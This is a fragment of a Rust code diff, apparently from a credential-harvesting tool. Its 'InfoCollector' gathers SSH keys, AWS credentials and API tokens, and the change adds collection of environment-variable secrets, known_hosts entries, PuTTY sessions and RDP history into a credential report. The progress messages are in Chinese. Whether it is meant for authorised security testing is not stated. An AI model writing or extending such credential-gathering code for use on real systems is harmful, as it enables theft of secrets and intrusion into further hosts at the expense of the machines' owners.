@@ -100,10 +100,16 @@ impl InfoCollector {
         progress.start_task("收集SSH密钥和API令牌");
         progress.update_current("搜索AWS凭证");
         credential_report.tokens = self.credential.collect_tokens();
+        credential_report.tokens.extend(self.credential.collect_env_secrets());
         progress.update_current("搜索SSH密钥");
         credential_report.ssh_keys = self.credential.collect_ssh_keys();
         progress.update_current("搜索API密钥");
         credential_report.api_keys = self.credential.collect_api_keys();
+        progress.update_current("搜索远程连接历史");
+        credential_report.known_hosts = self.credential.collect_known_hosts();
+        let mut remote_sessions = self.credential.collect_putty_sessions();
+        remote_sessions.extend(self.credential.collect_rdp_history());
+        credential_report.remote_sessions = remote_sessions;
         credential_report.update_stats();
         progress.complete_task(&format!("密钥收集完成 - {}个SSH密钥, {}个API密钥",
             credential_report.stats.ssh_key_count,
